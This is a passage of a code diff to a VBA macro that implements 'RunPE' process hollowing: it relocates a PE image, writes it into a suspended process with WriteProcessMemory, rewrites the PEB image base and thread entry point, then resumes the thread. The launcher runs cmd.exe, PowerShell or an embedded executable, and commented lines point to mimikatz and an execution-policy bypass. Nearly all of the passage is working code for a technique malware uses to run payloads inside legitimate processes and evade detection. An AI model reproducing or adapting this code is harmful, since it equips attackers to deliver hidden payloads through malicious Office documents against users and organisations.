+                Dim lEntriesNum As Long: lEntriesNum = (structReloc.SizeOfBlock - SIZEOF_IMAGE_BASE_RELOCATION) / SIZEOF_IMAGE_BASE_RELOCATION_ENTRY
+                Dim lPage As Long: lPage = structReloc.VirtualAddress
+                
+                Dim ptrBlock As LongPtr: ptrBlock = ptrStructReloc + SIZEOF_IMAGE_BASE_RELOCATION
+                Dim iBlock As Integer
+                Call RtlMoveMemory(VarPtr(iBlock), ptrBlock, SIZEOF_IMAGE_BASE_RELOCATION_ENTRY)
+                
+                iCount = 0
+                For iCount = 0 To (lEntriesNum - 1)
+                    Dim iBlockType As Integer: iBlockType = ((iBlock And &HF000) / &H1000) And &HF ' type = value >> 12
+                    Dim iBlockOffset As Integer: iBlockOffset = iBlock And &HFFF ' offset = value & 0xfff
+                    'Debug.Print ("    |   |__ Block: Type=" + Str(iBlockType) + " - Offset=0x" + Hex(iBlockOffset))
+                    
+                    If iBlockType = 0 Then
+                        Exit For
+                    End If
+
+                    Dim iPtrSize As Integer: iPtrSize = 0
+                    If iBlockType = &H3 Then ' 32 bits address
+                        iPtrSize = 4
+                    ElseIf iBlockType = &HA Then ' 64 bits address
+                        iPtrSize = 8
+                    End If
+                    
+                    Dim ptrRelocateAddr As LongPtr
+                    ptrRelocateAddr = ptrImageLocalCopy + lPage + iBlockOffset
+
+                    If iPtrSize <> 0 Then
+                        Dim ptrRelocate As LongPtr
+                        Call RtlMoveMemory(VarPtr(ptrRelocate), ptrRelocateAddr, iPtrSize)
+                        ptrRelocate = ptrRelocate - structNTHeaders.OptionalHeader.ImageBase + ptrProcessImageBase
+                        Call RtlMoveMemory(ptrRelocateAddr, VarPtr(ptrRelocate), iPtrSize)
+                    End If
+                    
+                    ptrBlock = ptrBlock + SIZEOF_IMAGE_BASE_RELOCATION_ENTRY
+                    Call RtlMoveMemory(VarPtr(iBlock), ptrBlock, SIZEOF_IMAGE_BASE_RELOCATION_ENTRY)
+                    
+                Next iCount
+            End If
+        Loop
+    End If
+    
+    
+    ' Write modified image to target process memory
+    Debug.Print ("[*] Writing modified source image to target process memory...")
+    Dim lWriteProcessMemory As Long
+    lWriteProcessMemory = WriteProcessMemory(structProcessInformation.hProcess, ptrProcessImageBase, ptrImageLocalCopy, structNTHeaders.OptionalHeader.SizeOfImage, 0&)
+    If lWriteProcessMemory = 0 Then
+        Debug.Print ("    |__ WriteProcessMemory() failed (Err:" + Str(Err.LastDllError) + ")")
+        Call TerminateProcess(structProcessInformation.hProcess, 0)
+        Exit Sub
+    Else
+        If VERBOSE Then
+            Debug.Print ("    |__ WriteProcessMemory() OK")
+        End If
+    End If
+    
+    
+    ' Free local memory
+    Call VirtualFree(ptrImageLocalCopy, structNTHeaders.OptionalHeader.SizeOfImage, &H10000) ' &H10000 = MEM_FREE
+    
+    
+    ' Applying new image base address to target PEB
+    Debug.Print ("[*] Applying new image base address to target PEB...")
+    Dim ptrPEBImageBaseAddr As LongPtr
+    #If Win64 Then
+        ptrPEBImageBaseAddr = structContext.Rdx + 16
+    #Else
+        ptrPEBImageBaseAddr = structContext.Ebx + 8
+    #End If
+    
+    If VERBOSE Then
+        Debug.Print ("    |__ Image base address location: 0x" + Hex(ptrPEBImageBaseAddr))
+        Debug.Print ("    |__ Image base address: 0x" + Hex(ptrProcessImageBase))
+    End If
+    
+    lWriteProcessMemory = WriteProcessMemory(structProcessInformation.hProcess, ptrPEBImageBaseAddr, VarPtr(ptrProcessImageBase), SIZEOF_ADDRESS, 0&)
+    If lWriteProcessMemory = 0 Then
+        Debug.Print ("    |__ WriteProcessMemory() failed (Err:" + Str(Err.LastDllError) + ")")
+        Call TerminateProcess(structProcessInformation.hProcess, 0)
+        Exit Sub
+    Else
+        If VERBOSE Then
+            Debug.Print ("    |__ WriteProcessMemory() OK")
+        End If
+    End If
+    
+    
+    ' Overwrite context with new entry point
+    Debug.Print ("[*] Overwriting context with new entry point...")
+    Dim ptrEntryPoint As LongPtr: ptrEntryPoint = ptrProcessImageBase + structNTHeaders.OptionalHeader.AddressOfEntryPoint
+    #If Win64 Then
+        structContext.Rcx = ptrEntryPoint
+    #Else
+        structContext.Eax = ptrEntryPoint
+    #End If
+    
+    If VERBOSE Then
+        Debug.Print ("    |__ New entry point: 0x" + Hex(ptrEntryPoint))
+    End If
+    
     Dim lSetThreadContext As Long
     lSetThreadContext = SetThreadContext(structProcessInformation.hThread, structContext)
     If lSetThreadContext = 0 Then
-        Debug.Print ("[-] |__ Couldn't apply context to the new thread")
+        Debug.Print ("    |__ SetThreadContext() failed (Err:" + Str(Err.LastDllError) + ")")
         Call TerminateProcess(structProcessInformation.hProcess, 0)
         Exit Sub
     Else
-        Debug.Print ("[+] |__ Applied context to the new thread")
+        If VERBOSE Then
+            Debug.Print ("    |__ SetThreadContext() OK")
+        End If
     End If
+    
     
     ' Resume thread
     ' |__ If ResumeThread succeeds, the return value is the thread's previous suspend count (i.e. 1 in this case)
-    Debug.Print ("[*] Resuming suspended process")
+    Debug.Print ("[*] Resuming suspended process...")
     Dim lResumeThread As Long
     lResumeThread = ResumeThread(structProcessInformation.hThread)
     If lResumeThread = 1 Then
-        Debug.Print ("[+] |__ RunPE complete, successfully resumed thread")
+        If VERBOSE Then
+            Debug.Print ("    |__ ResumeThread() OK")
+        End If
     Else
-        Debug.Print ("[-] |__ Resume thread failed")
+        Debug.Print ("    |__ ResumeThread() failed (Err:" + Str(Err.LastDllError) + ")")
         Call TerminateProcess(structProcessInformation.hProcess, 0)
         Exit Sub
     End If
+
+    Debug.Print ("[+] RunPE complete!!!")
+    
 End Sub
 
 ' --------------------------------------------------------------------------------
@@ -716,35 +945,37 @@ Public Sub Exploit()
     Debug.Print ("================================================================================")
     
     Dim strSrcFile As String
-    Dim strArguments As String
-    Dim strPE As String
-    Dim baFileContent() As Byte
+    Dim baSrcFileContent() As Byte
+    Dim strSrcArguments As String
+    Dim strSrcPE As String
     
-    'strSrcFile = "C:\Windows\System32\cmd.exe"
-    strSrcFile = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+    strSrcFile = "C:\Windows\System32\cmd.exe"
+    'strSrcFile = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+    'strSrcFile = "C:\Users\clement\Downloads\Win32\mimikatz.exe"
     
     'strSrcFile = "C:\Windows\SysWOW64\cmd.exe"
     'strSrcFile = "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
     
-    strArguments = "-exec Bypass"
+    'strSrcArguments = "-exec Bypass"
+    strSrcArguments = ""
     
-    strPE = PE()
-    If strPE = "" Then
+    strSrcPE = PE()
+    If strSrcPE = "" Then
         If Dir(strSrcFile) = "" Then
             Debug.Print ("[-] '" + strSrcFile + "' doesn't exist.")
             Exit Sub
         Else
-            Debug.Print ("[+] Source file: '" + strSrcFile + "'")
-            Debug.Print ("[*] |__ Command line: " + strSrcFile + " " + strArguments)
+            Debug.Print ("[*] Source file: '" + strSrcFile + "'")
+            If VERBOSE Then
+                Debug.Print ("    |__ Command line: " + strSrcFile + " " + strSrcArguments)
+            End If
         End If
-        baFileContent = FileToByteArray(strSrcFile)
-        Call RunPE(baFileContent, strArguments)
+        baSrcFileContent = FileToByteArray(strSrcFile)
+        Call RunPE(baSrcFileContent, strSrcArguments)
     Else
         Debug.Print ("[+] Source file: embedded PE")
-        baFileContent = StringToByteArray(strPE)
-        Call RunPE(baFileContent, strArguments)
+        baSrcFileContent = StringToByteArray(strSrcPE)
+        Call RunPE(baSrcFileContent, strSrcArguments)
     End If
 
 End Sub
-
-
